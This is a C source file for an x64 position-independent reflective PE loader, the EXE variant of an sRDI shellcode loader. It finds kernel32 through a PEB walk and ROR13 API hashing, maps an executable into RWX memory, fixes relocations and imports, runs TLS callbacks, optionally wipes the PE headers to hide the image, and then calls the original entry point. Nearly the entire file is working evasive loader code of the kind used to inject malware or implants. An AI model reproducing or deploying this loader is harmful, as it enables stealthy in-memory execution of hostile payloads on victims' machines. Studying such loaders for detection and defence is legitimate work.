// tools/pe_stub.c
//
// x64 position-independent PE loader stub: the EXE/OEP variant of the sRDI
// loader embedded in src/rdi_stub.rs.
//
// Instead of calling DllMain / a hashed export, this stub reflectively maps
// the PE image (headers, sections, base relocations, imports, TLS callbacks)
// and then calls the ORIGINAL ENTRY POINT
// (IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint).
//
// ENTRY-POINT CALLING CONVENTION (documented contract):
//   entry(rcx = mapped image base, rdx = 1, r8 = NULL)
// This matches BOTH common OEP signatures:
//   - MinGW/MSVC CRT EXE entry:  void mainCRTStartup(void)   (args ignored)
//   - DllMain-style entry:       BOOL DllMain(HMODULE, DWORD /*DLL_PROCESS_ATTACH=1*/, LPVOID)
//
// Invocation contract (Win64 fastcall), set up by the 69-byte bootstrap
// built in src/shellcode.rs (identical layout to the sRDI bootstrap):
//   rcx        = pointer to the raw PE image (immediately after this stub)
//   edx        = unused (kept for bootstrap parity with the DLL stub)
//   r8         = pointer to the user-data blob
//   r9d        = length of the user-data blob
//   [rsp+0x20] = flags (bit0: wipe PE headers after load)
//   [rsp+0x28] = base address of the shellcode itself
//
// Build (see tools/build_pe_stub.sh):
//   x86_64-w64-mingw32-gcc -Os -fno-builtin -fno-ident \
//       -fno-asynchronous-unwind-tables -fno-stack-protector \
//       -fomit-frame-pointer -nostdlib -Wl,-e,entry -Wl,--build-id=none \
//       pe_stub.c -o pe_stub.exe
//   x86_64-w64-mingw32-objcopy -O binary --only-section=.text \
//       pe_stub.exe pe_stub.bin
//
// PIC rules honoured here: no globals, no string literals, no stack arrays
// (gcc would emit memset/memcpy calls), no switch (jump tables live in
// .rdata). Kernel32 is found by PEB walk + ROR13 hashing, so the stub
// carries no data whatsoever - .text alone is position independent.

typedef unsigned char       u8;
typedef unsigned short      u16;
typedef unsigned int        u32;
typedef unsigned long long  u64;
typedef unsigned short      wchar;

// ── ROR13 API hashing (same algorithm as sRDI / metasploit block_api) ──

static inline __attribute__((always_inline)) u32 hash_str(const char *s) {
    u32 h = 0;
    while (*s) {
        h = (h >> 13) | (h << 19);
        h += (u8)*s;
        s++;
    }
    return h;
}

static inline __attribute__((always_inline)) u32 hash_w(const wchar *s) {
    u32 h = 0;
    while (*s) {
        wchar c = *s;
        if (c >= 'A' && c <= 'Z') c += 32;   // case-insensitive
        h = (h >> 13) | (h << 19);
        h += (u8)c;
        s++;
    }
    return h;
}

#define H_KERNEL32        0x8fecd63f  // hash_w(L"kernel32.dll")
#define H_LOADLIBRARYA    0xec0e4e8e  // hash_str("LoadLibraryA")
#define H_GETPROCADDRESS  0x7c0dfcaa  // hash_str("GetProcAddress")
#define H_VIRTUALALLOC    0x91afca54  // hash_str("VirtualAlloc")

// ── Minimal PE / PEB layouts (x64) ─────────────────────────────────────

static inline __attribute__((always_inline)) u16 rd16(u8 *p) { return (u16)(p[0] | (p[1] << 8)); }
static inline __attribute__((always_inline)) u32 rd32(u8 *p) {
    return (u32)p[0] | ((u32)p[1] << 8) | ((u32)p[2] << 16) | ((u32)p[3] << 24);
}
static inline __attribute__((always_inline)) u64 rd64(u8 *p) { return (u64)rd32(p) | ((u64)rd32(p + 4) << 32); }
static inline __attribute__((always_inline)) void wr64(u8 *p, u64 v) {
    p[0] = (u8)v;         p[1] = (u8)(v >> 8);
    p[2] = (u8)(v >> 16); p[3] = (u8)(v >> 24);
    p[4] = (u8)(v >> 32); p[5] = (u8)(v >> 40);
    p[6] = (u8)(v >> 48); p[7] = (u8)(v >> 56);
}

static inline __attribute__((always_inline)) void mem_cpy(u8 *d, const u8 *s, u64 n) {
    for (u64 i = 0; i < n; i++) d[i] = s[i];
}
static inline __attribute__((always_inline)) void mem_zero(u8 *d, u64 n) {
    for (u64 i = 0; i < n; i++) d[i] = 0;
}

static inline __attribute__((always_inline)) u8 *read_peb(void) {
    u8 *peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

// Walk PEB -> Ldr -> InMemoryOrderModuleList, match BaseDllName by hash.
static inline __attribute__((always_inline)) u8 *find_module(u32 want) {
    u8 *peb = read_peb();
    u8 *ldr = *(u8 **)(peb + 0x18);          // PEB->Ldr
    u8 *head = ldr + 0x20;                   // InMemoryOrderModuleList
    u8 *link = *(u8 **)(ldr + 0x20);         // first Flink
    while (link != head) {
        u8 *entry = link - 0x10;             // links are at +0x10 in the entry
        u8 *dll_base = *(u8 **)(entry + 0x30);
        wchar *name = *(wchar **)(entry + 0x60); // BaseDllName.Buffer
        if (name && hash_w(name) == want)
            return dll_base;
        link = *(u8 **)link;
    }
    return 0;
}

// Resolve an export of an already-loaded module by ROR13 name hash.
static inline __attribute__((always_inline)) u8 *get_export(u8 *base, u32 want) {
    u32 pe_off = rd32(base + 0x3C);
    u8 *nt = base + pe_off;
    u8 *opt = nt + 4 + 20;
    u32 exp_rva = rd32(opt + 112);           // DataDirectory[EXPORT]
    if (!exp_rva) return 0;
    u8 *exp = base + exp_rva;
    u32 n_names = rd32(exp + 24);
    u8 *names = base + rd32(exp + 32);
    u8 *ords  = base + rd32(exp + 36);
    u8 *funcs = base + rd32(exp + 28);
    for (u32 i = 0; i < n_names; i++) {
        char *nm = (char *)(base + rd32(names + i * 4));
        if (hash_str(nm) == want) {
            u16 o = rd16(ords + i * 2);
            return base + rd32(funcs + (u32)o * 4);
        }
    }
    return 0;
}

typedef u8 *(*fn_LoadLibraryA)(const char *);
typedef u8 *(*fn_GetProcAddress)(u8 *, const char *);
typedef u8 *(*fn_VirtualAlloc)(u8 *, u64, u32, u32);
typedef void (*fn_TlsCallback)(u8 *, u32, void *);
typedef void (*fn_EntryPoint)(u8 *, u32, void *);

// ── Loader entry (MUST be the first function emitted in .text) ─────────
// Keep this function at the TOP of the translation unit; the build script
// asserts it lands at offset 0 of the extracted .text section.

void entry(u8 *pe, u32 unused, u8 *ud, u32 udlen, u32 flags, u8 *scbase) {
    (void)unused; (void)ud; (void)udlen; (void)scbase;

    u8 *k32 = find_module(H_KERNEL32);
    if (!k32) return;
    fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)get_export(k32, H_LOADLIBRARYA);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)get_export(k32, H_GETPROCADDRESS);
    fn_VirtualAlloc   pVirtualAlloc   = (fn_VirtualAlloc)get_export(k32, H_VIRTUALALLOC);
    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) return;

    // ── Parse the raw PE image ────────────────────────────────────────
    u32 pe_off = rd32(pe + 0x3C);
    u8 *nt = pe + pe_off;
    u8 *fh = nt + 4;
    u16 n_sections = rd16(fh + 2);
    u16 opt_size   = rd16(fh + 16);
    u8 *opt = fh + 20;
    u32 entry_rva  = rd32(opt + 16);
    u64 image_base = rd64(opt + 24);
    u32 size_image = rd32(opt + 56);
    u32 size_hdrs  = rd32(opt + 60);
    u32 reloc_rva  = rd32(opt + 112 + 5 * 8);  // DataDirectory[BASERELOC]
    u32 import_rva = rd32(opt + 112 + 1 * 8);  // DataDirectory[IMPORT]
    u32 tls_rva    = rd32(opt + 112 + 9 * 8);  // DataDirectory[TLS]
    u8 *sections   = opt + opt_size;

    // ── Allocate the mapped image (RWX; one allocation, no VProtect) ──
    // MEM_RESERVE|MEM_COMMIT = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
    u8 *base = pVirtualAlloc((u8 *)image_base, size_image, 0x3000, 0x40);
    if (!base)
        base = pVirtualAlloc(0, size_image, 0x3000, 0x40);
    if (!base) return;

    mem_cpy(base, pe, size_hdrs);
    for (u16 i = 0; i < n_sections; i++) {
        u8 *s = sections + (u32)i * 40;
        u32 vsize = rd32(s + 8);
        u32 vaddr = rd32(s + 12);
        u32 rsize = rd32(s + 16);
        u32 raddr = rd32(s + 20);
        if (rsize && vsize)
            mem_cpy(base + vaddr, pe + raddr, rsize);
    }

    // ── Base relocations ──────────────────────────────────────────────
    u64 delta = (u64)base - image_base;
    if (delta && reloc_rva) {
        u8 *blk = base + reloc_rva;
        for (;;) {
            u32 page_rva = rd32(blk);
            u32 blk_size = rd32(blk + 4);
            if (!page_rva || !blk_size) break;
            u32 n = (blk_size - 8) / 2;
            u8 *ents = blk + 8;
            for (u32 i = 0; i < n; i++) {
                u16 e = rd16(ents + i * 2);
                if ((e >> 12) == 10) {         // IMAGE_REL_BASED_DIR64
                    u8 *loc = base + page_rva + (e & 0xFFF);
                    wr64(loc, rd64(loc) + delta);
                }
            }
            blk += blk_size;
        }
    }

    // ── Imports ───────────────────────────────────────────────────────
    if (import_rva) {
        u8 *desc = base + import_rva;
        while (rd32(desc + 12)) {              // Name
            u8 *hmod = pLoadLibraryA((char *)(base + rd32(desc + 12)));
            if (!hmod) { desc += 20; continue; }
            u32 oft = rd32(desc + 0);
            u8 *thunk_src = base + (oft ? oft : rd32(desc + 16));
            u8 *thunk_dst = base + rd32(desc + 16);
            while (rd64(thunk_src)) {
                u64 val = rd64(thunk_src);
                u8 *fn;
                if (val & 0x8000000000000000ULL) {
                    fn = pGetProcAddress(hmod, (char *)(val & 0xFFFF));
                } else {
                    fn = pGetProcAddress(hmod, (char *)(base + (u32)val + 2));
                }
                wr64(thunk_dst, (u64)fn);
                thunk_src += 8;
                thunk_dst += 8;
            }
            desc += 20;
        }
    }

    // ── TLS callbacks (DLL_PROCESS_ATTACH) ────────────────────────────
    if (tls_rva) {
        u8 *tls = base + tls_rva;
        u64 cbs_va = rd64(tls + 24);           // AddressOfCallBacks (absolute VA)
        if (cbs_va) {
            u64 *cbs = (u64 *)(cbs_va + delta);
            while (*cbs) {
                ((fn_TlsCallback)*cbs)(base, 1, 0);
                cbs++;
            }
        }
    }

    // ── Optionally wipe the PE headers post-load (flags bit0) ─────────
    if (flags & 1)
        mem_zero(base, size_hdrs);

    // ── Call the ORIGINAL ENTRY POINT ─────────────────────────────────
    // Convention: entry(rcx=image base, rdx=1 (DLL_PROCESS_ATTACH), r8=NULL).
    ((fn_EntryPoint)(base + entry_rva))(base, 1, 0);
}
